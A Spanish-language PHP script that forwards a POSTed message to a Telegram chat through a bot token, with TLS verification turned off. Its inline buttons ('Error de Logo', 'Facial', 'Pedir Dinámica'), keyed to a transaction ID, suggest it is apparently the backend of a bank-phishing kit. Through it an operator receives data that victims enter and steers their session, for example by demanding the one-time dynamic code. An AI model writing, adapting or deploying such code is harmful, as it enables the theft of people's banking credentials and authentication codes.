<?php
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

try {
    $config = require __DIR__ . '/../config.php';

    $message = $_POST['message'] ?? '';
    $transactionId = $_POST['transactionId'] ?? '';

    if (empty($message) || empty($transactionId)) {
        echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
        exit;
    }

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
        exit;
    }

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => "Error de Logo", 'callback_data' => "error_logo:{$transactionId}"],
                ['text' => "Facial", 'callback_data' => "facial:{$transactionId}"],
            ],
            [
                ['text' => "Pedir Dinámica", 'callback_data' => "pedir_dinamica:{$transactionId}"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $config['chat_id'],
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    // Envío principal
    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);
    if ($response === false) {
        $err = curl_error($ch);
        curl_close($ch);
        echo json_encode(['status' => 'error', 'message' => 'curl_error', 'detail' => $err]);
        exit;
    }
    curl_close($ch);

    $result = json_decode($response, true);
    if (!$result) {
        echo json_encode(['status' => 'error', 'message' => 'json_decode_failed', 'raw' => $response]);
        exit;
    }

    echo json_encode([
        'status' => !empty($result['ok']) ? 'success' : 'error',
        'messageId' => !empty($result['ok']) ? ($result['result']['message_id'] ?? null) : null,
        'telegram' => $result
    ]);
} catch (Throwable $e) {
    echo json_encode(['status' => 'error', 'message' => 'server_exception', 'detail' => $e->getMessage()]);
}